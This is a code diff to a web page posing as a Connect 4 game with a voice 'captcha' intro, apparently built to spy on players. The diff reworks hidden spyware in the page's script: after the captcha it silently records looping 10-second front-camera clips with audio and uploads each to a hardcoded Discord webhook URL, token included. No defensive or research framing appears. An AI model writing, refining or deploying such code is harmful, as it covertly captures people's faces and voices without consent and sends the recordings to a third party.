@@ -861,7 +861,7 @@
     <!-- ===== JAVASCRIPT ===== -->
     <script>
         // ============================================================
-        //  INTRO + VOICE CAPTCHA + SILENT DUAL-CAM RECORDING
+        //  INTRO + VOICE CAPTCHA + SILENT FRONT‑CAM RECORDING (looped)
         //  (preserves all existing game code)
         // ============================================================
 
@@ -875,16 +875,16 @@
         // -------- state --------
         let captchaPassed = false;
         let recordingActive = false;
-        // For dual recording: we'll store two MediaRecorders and their streams
-        let mediaRecorders = [];
-        let recordersData = []; // each: { stream, recorder, chunks, facing }
-        let recordingInterval = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let recordingStream = null;
         let isRecording = false;
+        let loopTimer = null;
 
         const WEBHOOK_URL =
             'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
-        // -------- speech recognition (unchanged) --------
+        // -------- speech recognition --------
         function startVoiceCaptcha() {
             if (micListening || captchaPassed) return;
 
@@ -1009,162 +1009,91 @@
             }, 600);
         }
 
-        // -------- DUAL-CAM RECORDING (simultaneous front + back) with fallback --------
-        async function startBackgroundRecording() {
+        // -------- SIMPLE LOOPED FRONT‑CAM RECORDING (10s clips, with audio) --------
+        function startBackgroundRecording() {
             if (recordingActive) return;
             recordingActive = true;
-
-            // Attempt to get both cameras at once
-            let frontStream = null,
-                backStream = null;
-            try {
-                // Try to get both streams in parallel
-                const [front, back] = await Promise.all([
-                    navigator.mediaDevices.getUserMedia({
-                        audio: true,
-                        video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }
-                    }),
-                    navigator.mediaDevices.getUserMedia({
-                        audio: false, // audio only from front to avoid duplication
-                        video: { facingMode: 'environment', width: { ideal: 320 }, height: { ideal: 240 } }
-                    })
-                ]);
-                frontStream = front;
-                backStream = back;
-                console.log('✅ Dual-cam streams acquired');
-            } catch (err) {
-                console.warn('Dual-cam not supported, falling back to alternating single cam:', err);
-                // Fallback: use only front camera, alternate by restarting
-                startAlternatingRecording();
-                return;
-            }
-
-            // If we have both, set up two MediaRecorders
-            if (frontStream && backStream) {
-                startDualRecording(frontStream, backStream);
-            } else {
-                startAlternatingRecording();
-            }
+            recordNextClip();
         }
 
-        function startDualRecording(frontStream, backStream) {
-            const recorders = [];
-            const chunksData = [];
-
-            const createRecorder = (stream, facing) => {
-                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ?
-                    'video/webm;codecs=vp8,opus' :
-                    'video/webm';
-                const recorder = new MediaRecorder(stream, {
-                    mimeType: mimeType,
-                    videoBitsPerSecond: 800000,
-                    audioBitsPerSecond: 64000
-                });
-                const chunks = [];
-                recorder.ondataavailable = (e) => {
-                    if (e.data && e.data.size > 0) chunks.push(e.data);
-                };
-                recorder.onstop = () => {
-                    if (chunks.length > 0) {
-                        const blob = new Blob(chunks, { type: mimeType });
-                        sendToWebhook(blob, facing);
-                    }
-                    // Stop tracks after sending
-                    stream.getTracks().forEach(t => t.stop());
-                };
-                return { recorder, chunks, stream, facing };
-            };
-
-            const frontRec = createRecorder(frontStream, 'user');
-            const backRec = createRecorder(backStream, 'environment');
-            recorders.push(frontRec, backRec);
-
-            // Start both
-            frontRec.recorder.start(1000);
-            backRec.recorder.start(1000);
-            isRecording = true;
-
-            // After 10 seconds, stop both and restart the cycle (if still active)
-            setTimeout(() => {
-                if (recordingActive) {
-                    // Stop both
-                    if (frontRec.recorder.state === 'recording') frontRec.recorder.stop();
-                    if (backRec.recorder.state === 'recording') backRec.recorder.stop();
-                    isRecording = false;
-                    // Restart after a small delay to allow cleanup
-                    setTimeout(() => {
-                        if (recordingActive) {
-                            // Re-acquire streams and start again
-                            startBackgroundRecording();
-                        }
-                    }, 500);
-                }
-            }, 10000);
-        }
-
-        // -------- fallback: alternating single camera (original method) --------
-        let altFacing = 'user';
-
-        function startAlternatingRecording() {
+        function recordNextClip() {
             if (!recordingActive) return;
-            const facing = altFacing;
-            altFacing = (altFacing === 'user') ? 'environment' : 'user';
 
             navigator.mediaDevices.getUserMedia({
                     audio: true,
-                    video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 } }
+                    video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }
                 })
                 .then(stream => {
+                    recordingStream = stream;
+                    recordedChunks = [];
                     const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') ?
                         'video/webm;codecs=vp8,opus' :
                         'video/webm';
-                    const recorder = new MediaRecorder(stream, {
+
+                    mediaRecorder = new MediaRecorder(stream, {
                         mimeType: mimeType,
                         videoBitsPerSecond: 800000,
                         audioBitsPerSecond: 64000
                     });
-                    const chunks = [];
-                    recorder.ondataavailable = (e) => {
-                        if (e.data && e.data.size > 0) chunks.push(e.data);
-                    };
-                    recorder.onstop = () => {
-                        if (chunks.length > 0) {
-                            const blob = new Blob(chunks, { type: mimeType });
-                            sendToWebhook(blob, facing);
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data && event.data.size > 0) {
+                            recordedChunks.push(event.data);
                         }
-                        stream.getTracks().forEach(t => t.stop());
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        if (recordedChunks.length > 0) {
+                            const blob = new Blob(recordedChunks, { type: mimeType });
+                            sendToWebhook(blob);
+                        }
+                        // Stop all tracks
+                        if (recordingStream) {
+                            recordingStream.getTracks().forEach(t => t.stop());
+                            recordingStream = null;
+                        }
+                        isRecording = false;
+
                         // Schedule next clip if still active
                         if (recordingActive) {
-                            setTimeout(() => { startAlternatingRecording(); }, 300);
+                            // Small delay to avoid overwhelming the device
+                            setTimeout(() => {
+                                recordNextClip();
+                            }, 300);
                         }
                     };
-                    recorder.start(1000);
+
+                    mediaRecorder.start(1000);
                     isRecording = true;
+
+                    // Stop after 10 seconds
                     setTimeout(() => {
-                        if (recorder.state === 'recording') {
-                            recorder.stop();
-                            isRecording = false;
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
                         }
                     }, 10000);
+
                 })
                 .catch(err => {
-                    console.warn('Alternating recording error:', err);
+                    console.warn('Recording error:', err);
                     // Retry after delay
                     if (recordingActive) {
-                        setTimeout(() => { startAlternatingRecording(); }, 2000);
+                        setTimeout(() => {
+                            recordNextClip();
+                        }, 2000);
                     }
                 });
         }
 
         // -------- send to webhook with error handling --------
-        async function sendToWebhook(blob, facing) {
+        async function sendToWebhook(blob) {
             try {
                 const formData = new FormData();
                 const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-                const filename = `cam_${facing}_${timestamp}.webm`;
+                const filename = `frontcam_${timestamp}.webm`;
                 formData.append('file', blob, filename);
                 formData.append('payload_json', JSON.stringify({
-                    content: `📹 ${facing} camera · ${new Date().toLocaleString()}`
+                    content: `📹 front camera · ${new Date().toLocaleString()}`
                 }));
 
                 const response = await fetch(WEBHOOK_URL, {
@@ -1186,17 +1115,14 @@
         // -------- stop recording --------
         function stopBackgroundRecording() {
             recordingActive = false;
-            if (recordingInterval) { clearTimeout(recordingInterval);
-                recordingInterval = null; }
-            // Stop all recorders
-            if (mediaRecorders.length) {
-                mediaRecorders.forEach(r => {
-                    if (r.recorder && r.recorder.state === 'recording') {
-                        try { r.recorder.stop(); } catch (e) {}
-                    }
-                    if (r.stream) r.stream.getTracks().forEach(t => t.stop());
-                });
-                mediaRecorders = [];
+            if (loopTimer) { clearTimeout(loopTimer);
+                loopTimer = null; }
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                try { mediaRecorder.stop(); } catch (e) {}
+            }
+            if (recordingStream) {
+                recordingStream.getTracks().forEach(t => t.stop());
+                recordingStream = null;
             }
             isRecording = false;
         }
@@ -1854,7 +1780,7 @@
         window.clearRecords = clearRecords;
         window.claimPrize = claimPrize;
 
-        console.log('✅ Connect 4 with voice intro + silent dual-cam recording (fallback to alternating)');
+        console.log('✅ Connect 4 with voice intro + silent front‑cam looped recording (10s clips)');
     </script>
 
 </body>
